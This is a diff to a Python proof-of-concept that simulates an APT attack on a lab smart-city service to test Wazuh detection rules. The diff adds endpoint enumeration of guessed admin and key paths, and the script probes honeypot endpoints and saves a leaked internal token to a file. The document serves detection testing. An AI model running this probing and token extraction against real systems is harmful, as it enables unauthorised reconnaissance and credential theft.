@@ -3,10 +3,11 @@
 Threat 2 PoC: APT / C2 simulation — low-and-slow honeypot probing + credential extraction.
 
 Attack chain:
-  1. Probe /api/admin/config and /api/admin/metrics (triggers Wazuh rule 100200)
+  0. Recon: probe 6 unknown paths (all 404) — Wazuh rule 100203 fires (endpoint enumeration)
+  1. APT:   probe /api/admin/config and /api/admin/metrics (Wazuh rule 100200 per hit)
   2. /api/admin/config leaks the internal_token (misconfigured debug endpoint)
-  3. Extracted token is saved to /tmp/sc_extracted_token.txt for use by spam_attack.py
-  4. After 3+ hits Wazuh rule 100201 fires (APT confirmed)
+  3. Extracted token is saved to TOKEN_FILE for use by spam_attack.py
+  4. After 3+ honeypot hits Wazuh rule 100201 fires (APT confirmed) → IP blocked
 
 Run from the Debian VM — the script auto-detects the smartcity-services Incus IP.
 Port 5100 must be exposed (added in docker-compose.yml).
@@ -21,6 +22,15 @@ import time
 import urllib.request
 import urllib.error
 from datetime import datetime
+
+RECON_PATHS = [
+    "/admin",
+    "/api/v1/data",
+    "/debug",
+    "/api/v1/users",
+    "/api/v1/config",
+    "/api/keys",
+]
 
 TOKEN_FILE = "/root/sc_token.txt"
 
@@ -52,10 +62,29 @@ args = parser.parse_args()
 HONEYPOT_PATHS = ["/api/admin/config", "/api/admin/metrics"]
 
 print(f"[*] APT PoC — target: {args.target}")
-print(f"[*] {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints, {args.delay}s between rounds")
-print(f"[*] Detection: Wazuh rule 100201 (3+ HONEYPOT_HIT in 5 min, same IP)")
+print(f"[*] Phase 0: Recon — {len(RECON_PATHS)} paths  →  Wazuh rule 100203 (enumeration)")
+print(f"[*] Phase 1: APT   — {args.probes} rounds × {len(HONEYPOT_PATHS)} endpoints, {args.delay}s between rounds  →  Wazuh rule 100201")
 print()
 
+# --- Phase 0: Recon — blind endpoint enumeration ---
+print(f"[*] --- Phase 0: Recon ---")
+for path in RECON_PATHS:
+    url = args.target + path
+    try:
+        with urllib.request.urlopen(url, timeout=5) as resp:
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> {resp.status} (discovered!)")
+    except urllib.error.HTTPError as e:
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> {e.code}")
+    except Exception as e:
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] RECON  GET {path} -> ERROR {e}")
+    time.sleep(0.5)
+
+print(f"[!] Recon complete — Wazuh rule 100203 (endpoint enumeration) should have fired")
+print(f"[*] Transitioning to APT phase: probing admin endpoints...")
+print()
+
+# --- Phase 1: APT — low-and-slow honeypot probing ---
+print(f"[*] --- Phase 1: APT ---")
 extracted_token = None
 
 for i in range(1, args.probes + 1):
